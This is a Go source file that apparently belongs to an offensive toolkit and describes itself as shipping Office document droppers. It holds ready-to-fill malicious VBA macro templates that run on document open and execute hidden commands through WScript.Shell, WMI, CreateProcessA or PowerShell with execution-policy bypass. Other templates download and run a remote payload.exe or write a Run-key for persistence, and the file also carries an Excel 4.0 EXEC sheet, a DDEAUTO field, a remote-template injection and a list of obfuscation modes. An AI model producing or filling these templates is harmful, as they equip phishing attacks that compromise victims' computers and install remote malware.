// Package macro ships Office document droppers — VBA macro templates,
// XLM macro sheet layouts, DDE field code strings, and remote-template
// XML. Go analogue of Program/macro/. Data package: strings only.
package macro

import "strings"

// VBAKind identifies a VBA payload shape.
type VBAKind string

const (
	VBAShell      VBAKind = "shell"
	VBAWMI        VBAKind = "wmi"
	VBAWin32      VBAKind = "win32"
	VBAPowerShell VBAKind = "powershell"
	VBADownload   VBAKind = "download"
	VBAPersist    VBAKind = "persist"
)

// VBA template constants — same shape as Program/macro/vba.py.
//
// Every template uses Auto_Open as the trigger and includes AutoOpen /
// Workbook_Open / Document_Open aliases so the macro fires regardless of
// which Office app loads the document.

const VBAHeader = `Sub Auto_Open()
    Dim cmd As String
    cmd = "__CMD__"
    Shell cmd, vbHide
End Sub

Sub AutoOpen()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub

Sub Document_Open()
    Auto_Open
End Sub`

// VBAShellTemplate uses WScript.Shell.Run.
const VBAShellTemplate = `Private Sub Auto_Open()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run "__CMD__", 0, False
End Sub

Private Sub AutoOpen(): Auto_Open: End Sub
Private Sub Workbook_Open(): Auto_Open: End Sub
Private Sub Document_Open(): Auto_Open: End Sub`

// VBAWMITemplate uses WMI Win32_Process.Create.
const VBAWMITemplate = `Private Sub Auto_Open()
    Dim w As Object
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    w.Get("Win32_Process").Create "__CMD__", Null, Null
End Sub

Private Sub AutoOpen(): Auto_Open: End Sub
Private Sub Workbook_Open(): Auto_Open: End Sub
Private Sub Document_Open(): Auto_Open: End Sub`

// VBAWin32Template uses CreateProcess via Kernel32 declarations.
const VBAWin32Template = `Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
    ByVal lpApplicationName As String, ByVal lpCommandLine As String, _
    ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, _
    ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, _
    ByRef lpStartupInfo As Long, ByRef lpProcessInformation As Long) As Long

Private Sub Auto_Open()
    Dim si As Long: Dim pi As Long
    CreateProcessA vbNullString, "__CMD__", 0&, 0&, 0&, 0&, 0&, vbNullString, si, pi
End Sub

Private Sub AutoOpen(): Auto_Open: End Sub
Private Sub Workbook_Open(): Auto_Open: End Sub
Private Sub Document_Open(): Auto_Open: End Sub`

// VBAPowerShellTemplate shells out to PowerShell.
const VBAPowerShellTemplate = `Private Sub Auto_Open()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run "powershell -w hidden -ep bypass -c ""__CMD__""", 0, False
End Sub

Private Sub AutoOpen(): Auto_Open: End Sub
Private Sub Workbook_Open(): Auto_Open: End Sub
Private Sub Document_Open(): Auto_Open: End Sub`

// VBADownloadTemplate downloads and runs a remote payload.
const VBADownloadTemplate = `Private Sub Auto_Open()
    Dim x As Object
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", "__URL__", False
    x.Send
    Dim s As Object
    Set s = CreateObject("ADODB.Stream")
    s.Open
    s.Type = 1
    s.Write x.ResponseBody
    s.SaveToFile Environ("TEMP") & "\payload.exe", 2
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run Environ("TEMP") & "\payload.exe", 0, False
End Sub

Private Sub AutoOpen(): Auto_Open: End Sub
Private Sub Workbook_Open(): Auto_Open: End Sub
Private Sub Document_Open(): Auto_Open: End Sub`

// VBAPersistTemplate writes a Run registry entry.
const VBAPersistTemplate = `Private Sub Auto_Open()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Update", _
        "powershell -w hidden -ep bypass -c ""__CMD__""", "REG_SZ"
End Sub

Private Sub AutoOpen(): Auto_Open: End Sub
Private Sub Workbook_Open(): Auto_Open: End Sub
Private Sub Document_Open(): Auto_Open: End Sub`

// VBATemplates maps each kind to its source.
var VBATemplates = map[VBAKind]string{
	VBAShell:      VBAShellTemplate,
	VBAWMI:        VBAWMITemplate,
	VBAWin32:      VBAWin32Template,
	VBAPowerShell: VBAPowerShellTemplate,
	VBADownload:   VBADownloadTemplate,
	VBAPersist:    VBAPersistTemplate,
}

// VBATrigger identifies a macro entry-point name.
type VBATrigger string

const (
	TriggerAutoOpen     VBATrigger = "autoopen"
	TriggerDocumentOpen VBATrigger = "document_open"
	TriggerWorkbookOpen VBATrigger = "workbook_open"
	TriggerNewM         VBATrigger = "newm"
	TriggerExcelAuto    VBATrigger = "excel_auto"
)

// Triggers is the list of aliases the templates already carry.
var Triggers = []VBATrigger{TriggerAutoOpen, TriggerDocumentOpen, TriggerWorkbookOpen, TriggerNewM, TriggerExcelAuto}

// ObfuscationModes are the transformations the VBA generator can apply.
type ObfuscationMode string

const (
	ObfNone   ObfuscationMode = "none"
	ObfChr    ObfuscationMode = "chr"
	ObfBase64 ObfuscationMode = "base64"
	ObfSplit  ObfuscationMode = "split"
)

// XLM template. The XLM (Excel 4.0 macro) sheet is loaded via
// Auto_Open cell names.
const XLMTemplate = `; Excel 4.0 macro sheet layout
; Paste these as the contents of a sheet renamed to "Auto_Open":
;
; A1: =EXEC("__CMD__")
; A2: =HALT()
`

// DDE field code — Word's DDEAUTO runs a command when the user clicks
// through the (deprecated) prompt.
const DDEField = `{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k __CMD__" }`

// XMLRemoteTemplate is the settings.xml.rels content that points a .docx
// at a remote .dotm. When Word opens the doc, it fetches the template
// and runs the template's macros.
const XMLRemoteTemplate = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="__URL__" TargetMode="External"/>
</Relationships>`

// Fill substitutes the placeholders in a template. Recognized keys are
// __CMD__, __URL__, __SENDER__, __SUBJECT__.
func Fill(body string, vars map[string]string) string {
	out := body
	for k, v := range vars {
		out = strings.ReplaceAll(out, k, v)
	}
	return out
}

// ReverseCmd reverses a command string — the base of the simple Chr
// obfuscation used by the VBA generator.
func ReverseCmd(cmd string) string {
	runes := []rune(cmd)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}
